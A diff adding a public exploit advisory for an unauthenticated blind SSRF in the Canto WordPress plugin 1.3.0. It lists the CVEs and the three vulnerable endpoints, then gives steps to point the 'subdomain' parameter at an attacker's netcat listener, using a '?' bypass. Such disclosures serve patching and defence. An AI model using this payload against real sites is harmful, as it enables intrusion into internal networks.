@@ -1,0 +1,26 @@
+# Exploit Title: Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)
+# Date: 03/12/2020
+# Exploit Author: Pankaj Verma (_p4nk4j)
+# Vendor Homepage: https://www.canto.com/integrations/wordpress/
+# Software Link: https://github.com/CantoDAM/Canto-Wordpress-Plugin
+# Version: 1.3.0
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2020-28976, CVE-2020-28977, CVE-2020-28978
+
+
+Description:-
+The Canto plugin 1.3.0 for WordPress contains Blind SSRF Vulnerabilities.
+It allows an unauthenticated attacker to make a request to any Internal and External Server via "subdomain" parameter.
+
+Vulnerable Parameters and Endpoints:-
+https://target/wp-content/plugins/canto/includes/lib/detail.php?subdomain=
+https://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=
+https://target/wp-content/plugins/canto/includes/lib/tree.php?subdomain=
+
+Steps To Reproduce:-
+1. Start a Netcat Listener on any port For e.g. 4499
+2. Navigate to "<wordpress_server>/wp-content/plugins/canto/includes/lib/detail.php?subdomain="
+3. Add the Attacker's IP and Port For e.g. "172.17.0.1:4499?" to "subdomain=" parameter.
+4. Observe the response we got from the Target on Attacker's Listener.
+
+Note:- Using "?" in the payload is mandatory as it acts as a bypass to conduct this attack.
